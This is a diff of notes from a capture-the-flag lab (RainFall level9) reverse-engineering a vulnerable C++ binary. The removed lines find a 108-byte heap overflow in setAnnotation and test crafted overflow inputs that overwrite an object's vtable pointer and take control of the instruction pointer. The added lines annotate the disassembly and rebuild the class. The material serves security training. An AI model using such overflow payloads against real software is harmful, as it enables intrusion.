@@ -1,171 +1,200 @@
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
 
-(gdb) disas main
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048464  _init
+0x080484b0  __cxa_atexit
+0x080484b0  __cxa_atexit@plt
+0x080484c0  __gmon_start__
+0x080484c0  __gmon_start__@plt
+0x080484d0  std::ios_base::Init::Init()
+0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x080484f0  _exit
+0x080484f0  _exit@plt
+0x08048500  _ZNSt8ios_base4InitD1Ev
+0x08048500  _ZNSt8ios_base4InitD1Ev@plt
+0x08048510  memcpy
+0x08048510  memcpy@plt
+0x08048520  strlen
+0x08048520  strlen@plt
+0x08048530  operator new(unsigned int)
+0x08048530  _Znwj@plt
+0x08048540  _start
+0x08048570  __do_global_dtors_aux
+0x080485d0  frame_dummy
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x08048770  __libc_csu_init
+0x080487e0  __libc_csu_fini
+0x080487e2  __i686.get_pc_thunk.bx
+0x080487f0  __do_global_ctors_aux
+0x0804881c  _fini
+(gdb)
+
+(gdb) disas  main
 Dump of assembler code for function main:
    0x080485f4 <+0>:	push   ebp
    0x080485f5 <+1>:	mov    ebp,esp
    0x080485f7 <+3>:	push   ebx
    0x080485f8 <+4>:	and    esp,0xfffffff0
    0x080485fb <+7>:	sub    esp,0x20
-   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
+   
+   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1					- if argc <= 1
    0x08048602 <+14>:	jg     0x8048610 <main+28>
    0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
    0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
-   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
-   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
-   0x0804861c <+40>:	mov    ebx,eax
-   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
-   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
-   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
-   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
-   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
-   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
-   0x0804863e <+74>:	mov    ebx,eax
-   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
-   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
-   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+
+   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c						- 108 dans esp, argument du new
+   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>					- operator new(unsigned int)
+   0x0804861c <+40>:	mov    ebx,eax									- n1 = new(108)
+   
+   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5					- argument 2 >> 5
+   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx						- argument 1 >> class N
+   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>					- constructor N(int n)
+   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx					- n1 = new N(5)	
+
+   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c						- 108 dans esp, argument du new
+   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>					- operator new(unsigned int)
+   0x0804863e <+74>:	mov    ebx,eax									- n2 = new(108)
+   
+   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6					- argument 2 >> 6
+   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx						- argument 1 >> class N
+   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>					- constructor N(int n)
    0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
+   
    0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
    0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
    0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
+
    0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048667 <+115>:	add    eax,0x4
    0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
+
    0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
    0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048674 <+128>:	mov    DWORD PTR [esp],eax
-   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>		- N->setAnnotation(char *str)
+
    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+
    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
    0x08048690 <+156>:	mov    DWORD PTR [esp],eax
    0x08048693 <+159>:	call   edx
    0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
+
    0x08048698 <+164>:	leave
    0x08048699 <+165>:	ret
 End of assembler dump.
 
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
+You can use c++filt to decipher individual symbols
+$ c++filt _Znwj
+operator new(unsigned int)
 
-Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+****** La classe N a 3 fonctions et un constructor ******
+	- N::N(int) >> constructor >> _ZN1NC2Ei
+	- N::setAnnotation(char*) >> _ZN1N13setAnnotationEPc 
+	- N::operator+(N&)
+	- N::operator-(N&)
 
+$ objdump -M intel -d level9
 
-Program received signal SIGSEGV, Segmentation fault.
-0x08048682 in main ()
-(gdb) i r
-eax            0x41366441	1094083649
-ecx            0x3965	14693
-edx            0x804a0a2	134520994
-ebx            0x804a078	134520952
-esp            0xbffff640	0xbffff640
-ebp            0xbffff668	0xbffff668
-esi            0x0	0
-edi            0x0	0
-eip            0x8048682	0x8048682 <main+142>
-eflags         0x210283	[ CF SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
+080486f6 <_ZN1NC1Ei>:
+ 80486f6:	55                   	push   ebp
+ 80486f7:	89 e5                	mov    ebp,esp
+ 80486f9:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 80486fc:	c7 00 48 88 04 08    	mov    DWORD PTR [eax],0x8048848
+ 8048702:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 8048705:	8b 55 0c             	mov    edx,DWORD PTR [ebp+0xc]
+ 8048708:	89 50 68             	mov    DWORD PTR [eax+0x68],edx
+ 804870b:	5d                   	pop    ebp
+ 804870c:	c3                   	ret
+ 804870d:	90                   	nop
 
->> eax = 0x41366441 = A6dA
-donc buffer = 108
+0804870e <_ZN1N13setAnnotationEPc>:
+ 804870e:	55                   	push   ebp
+ 804870f:	89 e5                	mov    ebp,esp
+ 8048711:	83 ec 18             	sub    esp,0x18
+ 8048714:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 8048717:	89 04 24             	mov    DWORD PTR [esp],eax
+ 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
+ 804871f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
+ 8048722:	83 c2 04             	add    edx,0x4
+ 8048725:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 8048729:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 804872c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 8048730:	89 14 24             	mov    DWORD PTR [esp],edx
+ 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
+ 8048738:	c9                   	leave
+ 8048739:	c3                   	ret
 
-On peut le voir avec ltrace aussi
-level9@RainFall:~$ ltrace ./level9 $(python -c "print 'A' * 109")
-__libc_start_main(0x80485f4, 2, 0xbffff744, 0x8048770, 0x80487e0 <unfinished ...>
-_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)            = 0xb7fce990
-__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                         = 0
-_Znwj(108, 0xbffff744, 0xbffff750, 0xb7d79e55, 0xb7fed280)                                    = 0x804a008
-_Znwj(108, 5, 0xbffff750, 0xb7d79e55, 0xb7fed280)                                             = 0x804a078
-strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                 = 109
-memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109)                                = 0x0804a00c
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
+0804873a <_ZN1NplERS_>:
+ 804873a:	55                   	push   ebp
+ 804873b:	89 e5                	mov    ebp,esp
+ 804873d:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 8048740:	8b 50 68             	mov    edx,DWORD PTR [eax+0x68]
+ 8048743:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 8048746:	8b 40 68             	mov    eax,DWORD PTR [eax+0x68]
+ 8048749:	01 d0                	add    eax,edx
+ 804874b:	5d                   	pop    ebp
+ 804874c:	c3                   	ret
+ 804874d:	90                   	nop
 
-**TO GET CONTROL OF EIP**
+0804874e <_ZN1NmiERS_>:
+ 804874e:	55                   	push   ebp
+ 804874f:	89 e5                	mov    ebp,esp
+ 8048751:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 8048754:	8b 50 68             	mov    edx,DWORD PTR [eax+0x68]
+ 8048757:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 804875a:	8b 40 68             	mov    eax,DWORD PTR [eax+0x68]
+ 804875d:	89 d1                	mov    ecx,edx
+ 804875f:	29 c1                	sub    ecx,eax
+ 8048761:	89 c8                	mov    eax,ecx
+ 8048763:	5d                   	pop    ebp
+ 8048764:	c3                   	ret
+ 8048765:	90                   	nop
+ 8048766:	90                   	nop
+ 8048767:	90                   	nop
+ 8048768:	90                   	nop
+ 8048769:	90                   	nop
+ 804876a:	90                   	nop
+ 804876b:	90                   	nop
+ 804876c:	90                   	nop
+ 804876d:	90                   	nop
+ 804876e:	90                   	nop
+ 804876f:	90                   	nop
 
-(gdb) r $(python -c "print 'A' * 108 + 'CCCC'")
-Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + 'CCCC'")
+$ c++filt _ZN1NmiERS_
+N::operator-(N&)
 
-Breakpoint 1, 0x08048682 in main ()
-(gdb) c
-Continuing.
+$ c++filt _ZN1NplERS_
+N::operator+(N&)
 
-Program received signal SIGSEGV, Segmentation fault.
-0x08048682 in main ()
-(gdb) i r
-eax            0x43434343	1128481603
-ecx            0x43434343	1128481603
-edx            0x804a07c	134520956
-ebx            0x804a078	134520952
-esp            0xbffff670	0xbffff670
-ebp            0xbffff698	0xbffff698
-esi            0x0	0
-edi            0x0	0
-eip            0x8048682	0x8048682 <main+142>
-eflags         0x210287	[ CF PF SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/10x 0x804a078
-0x804a078:	0x43434343	0x00000000	0x00000000	0x00000000
-0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a098:	0x00000000	0x00000000
-(gdb) x/10x 0x804a078 - 112
-0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
-0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a028:	0x41414141	0x41414141
-(gdb) disas 0x804a008
-No function contains specified address.
-(gdb) disas 0x08048848
-Dump of assembler code for function _ZTV1N:
-   0x08048840 <+0>:	add    BYTE PTR [eax],al
-   0x08048842 <+2>:	add    BYTE PTR [eax],al
-   0x08048844 <+4>:	push   esp
-   0x08048845 <+5>:	mov    BYTE PTR [eax+ecx*1],al
-   0x08048848 <+8>:	cmp    al,BYTE PTR [edi-0x78b1f7fc]
-   0x0804884e <+14>:	add    al,0x8
-End of assembler dump.
-(gdb) !echo "obase=16;ibase=16;0x08048848+4"|bc
-(standard_in) 1: syntax error
-(gdb) !echo "obase=16;ibase=16;08048848+4"|bc
-804884C
-(gdb) r $(python -c "print 'A' * 108 + '\x4c\x88\x04\x08'")
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
+Donc la classe N ressemblera à:
 
-Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + '\x4c\x88\x04\x08'")
+class N {
+	public:
 
-Breakpoint 1, 0x08048682 in main ()
-(gdb) c
-Continuing.
-[Inferior 1 (process 14576) exited with code 0305]
-(gdb) !echo "obase=16;ibase=16;804a008+4"|bc
-(standard_in) 1: syntax error
-(gdb) !echo "obase=16;ibase=16;804a008+4"|bc
-(standard_in) 1: syntax error
-(gdb) !echo "obase=16;ibase=16;804A008+4"|bc
-804A00C
-(gdb) r $(python -c "print 'A' * 108 + '\x0c\xa0\x04\x08'")
-Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + '\x0c\xa0\x04\x08'")
+	N(int n) {}
 
-Breakpoint 1, 0x08048682 in main ()
-(gdb) c
-Continuing.
+	setAnnotation(char *str) {
+		memcpy(dst, src, strlen(str))
+	}
+	operator+(N&) {}
+	operator-(N&) {}
 
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb)
+}
+
